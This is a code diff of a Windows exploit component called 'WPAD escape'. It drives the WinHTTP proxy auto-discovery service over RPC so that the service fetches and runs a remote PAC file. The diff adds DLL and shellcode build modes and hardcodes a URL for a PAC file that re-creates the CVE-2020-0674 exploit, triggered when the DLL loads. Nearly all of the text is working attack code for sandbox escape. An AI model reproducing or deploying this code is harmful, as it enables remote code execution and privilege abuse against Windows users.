@@ -10,25 +10,33 @@
 // Global settings
 ////////
 
-#define EXE_BUILD
+//#define DEBUG
+//#define EXE_BUILD
+#define DLL_BUILD
+#define SHELLCODE_BUILD
+#define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
 
 ////////
 ////////
 // Debug logic
 ////////
 
+#ifdef DEBUG
 void DebugLog(const wchar_t *Format, ...) {
     va_list Args;
-    wchar_t Buffer[10000] = { 0 };
+    wchar_t *pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
     va_start(Args, Format);
-    wvsprintf(Buffer, Format, Args);
+    wvsprintf(pBuffer, Format, Args);
     va_end(Args);
-
-    //MessageBoxW(0, Buffer, L"WPAD escape", 0);
+#ifdef DLL_BUILD
+    MessageBoxW(0, pBuffer, L"WPAD escape", 0);
+#endif
 #ifdef EXE_BUILD
     printf("%ws\r\n", Buffer);
 #endif
+    HeapFree(GetProcessHeap(), 0, pBuffer);
 }
+#endif
 
 ////////
 ////////
@@ -56,8 +64,8 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     RPC_STATUS RpcStatus = RPC_S_OK;
     RPC_BINDING_HANDLE hRpcBinding = NULL;
     HANDLE hNameResTrkRecord = NULL;
-    wchar_t AutoConfigUrl[5000] = { 0 };
-    //wchar_t PacUrlRandom[200] = { 0 };
+    uint32_t dwAutoConfigUrlLen = (wcslen(PacUrl) + 1) + 500;
+    wchar_t* pAutoConfigUrl = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwAutoConfigUrlLen * 2);
     RPC_ASYNC_STATE RpcAsyncState = { 0 };
     tagProxyResolveUrl ProxyResolveUrl = { 0 };
     WINHTTP_PROXY_RESULT_EX ProxyResult = { 0 };
@@ -66,12 +74,12 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
     // Make a unique variation of the specified PAC URL to avoid WPAD cache issues
 
-    _snwprintf_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), ARRAYSIZE(AutoConfigUrl), L"%ws?%lld", PacUrl, __rdtsc()
-    );
+    _snwprintf_s(pAutoConfigUrl, dwAutoConfigUrlLen, dwAutoConfigUrlLen, L"%ws?%lld", PacUrl, __rdtsc());
+#ifdef DEBUG
+    DebugLog(L"... target PAC URL: %ws", pAutoConfigUrl);
+#endif
 
-    //wcscpy_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrl);
-    //wcscat_s(AutoConfigUrl, ARRAYSIZE(AutoConfigUrl), PacUrlRandom);
-    DebugLog(L"... target PAC URL: %ws", AutoConfigUrl);
+    // Create the configuration structs used in invoking the GetProxyForUrl method
 
     ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
     ProxyResolveUrl.Domain = L"www.google.com";
@@ -79,13 +87,8 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
     ProxyResolveUrl.Member4 = 0x3;   // Contant still UNKNOWN. Another valid value is 0x4
     ProxyResolveUrl.Member5 = 0x50;  // Contant still UNKNOWN. Another valid value is 0x1BB
 
-    AutoProxyOptions.lpszAutoConfigUrl = AutoConfigUrl;
+    AutoProxyOptions.lpszAutoConfigUrl = pAutoConfigUrl;
     AutoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL | WINHTTP_AUTOPROXY_RUN_OUTPROCESS_ONLY;
-
-    /*
-    The below constants are UNKNOW at the moment.
-    This was found by reversing winhttp.dll.
-    */
 
     SessionOptions.dwMaxTimeout = 0xffffffff;
     SessionOptions.dwTimeout1 = 0x0000ea60; // seems like dwTimeout 60000 MS
@@ -108,23 +111,17 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
         RpcStatus = RpcBindingFromStringBindingW(StringBinding, &hRpcBinding); // Create the primary RPC binding handle
 
         if (RpcStatus == RPC_S_OK) {
-            // Initialize an asynchronous RPC state handle which will be used for the actual remote call GetProxyForUrl
-
-            RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState));
+            RpcStatus = RpcAsyncInitializeHandle(&RpcAsyncState, sizeof(RpcAsyncState)); // Initialize an asynchronous RPC state handle which will be used for the actual remote call GetProxyForUrl
 
             if (RpcStatus == RPC_S_OK) {
                 RpcAsyncState.UserInfo = NULL;
                 RpcAsyncState.NotificationType = RpcNotificationTypeEvent;
                 RpcAsyncState.u.hEvent = CreateEventW(NULL, FALSE, FALSE, NULL); // https://docs.microsoft.com/en-us/windows/desktop/api/rpcasync/ns-rpcasync-_rpc_async_state
 
-                RpcTryExcept
-                {
-                    /*
-                    Call the GetProxyForUrl interface method which is responsible for initiating
-                    the RPC request to WinHTTP Web Proxy Auto-Discovery Service to fetch the PAC file.
-                    */
-
+                RpcTryExcept {
+#ifdef DEBUG
                     DebugLog(L"... calling GetProxyForUrl RPC method.");
+#endif
 
                     GetProxyForUrl(
                         &RpcAsyncState,
@@ -139,11 +136,11 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                         &hNameResTrkRecord,
                         &dwWinHttpStatusCode
                     );
-
-                    DebugLog(L"... GetProxyForUrl returned (async)");
                 }
                 RpcExcept(1) {
+#ifdef DEBUG
                     DebugLog(L"... GetProxyForUrl failed. Error: 0x%X", RpcExceptionCode());
+#endif
                 }
                 RpcEndExcept
 
@@ -154,40 +151,55 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
                 }
                 
                 if (dwWaitResult == WAIT_OBJECT_0) {
+#ifdef DEBUG
                     DebugLog(L"... RPC call to WPAD GetProxyForUrl signalled async state event.");
+#endif
                     RpcAsyncCompleteCall(&RpcAsyncState, &nReply);
                 }
                 else {
+#ifdef DEBUG
                     DebugLog(L"... RPC call to WPAD GetProxyForUrl async event wait failed (error 0x%08x)\r\n", dwWaitResult);
+#endif
                     RpcAsyncCancelCall(&RpcAsyncState, TRUE);
                 }
             }
             else {
+#ifdef DEBUG
                 DebugLog(L"... RpcAsyncInitializeHandle failed. Error: 0x%X", RpcStatus);
+#endif
             }
 
             RpcBindingFree(&hRpcBinding);
         }
         else {
+#ifdef DEBUG
             DebugLog(L"... RpcBindingFromStringBindingW failed. Error: 0x%X", RpcStatus);
+#endif
         }
 
         RpcStringFreeW(&StringBinding);
     }
     else {
+#ifdef DEBUG
         DebugLog(L"... RpcStringBindingCompose failed. Error: 0x%X", RpcStatus);
+#endif
     }
+
+    HeapFree(GetProcessHeap(), 0, pAutoConfigUrl);
 
     return RpcStatus;
 }
-
 
 #ifdef DLL_BUILD
 BOOL APIENTRY DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
-            WpadEscape(TARGET_PAC_URL);
+#ifdef SHELLCODE_BUILD
+            WpadInjectPac(TARGET_PAC_URL);
             Sleep(INFINITE);
+#else
+            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WpadInjectPac, (PVOID)TARGET_PAC_URL, 0, NULL);
+#endif
             break;
         case DLL_THREAD_ATTACH:
             break;
@@ -200,7 +212,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
     return TRUE;
 }
 #else
-
 int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
     if (nArgc < 2) {
         DebugLog(L"... no PAC URL argument provided");
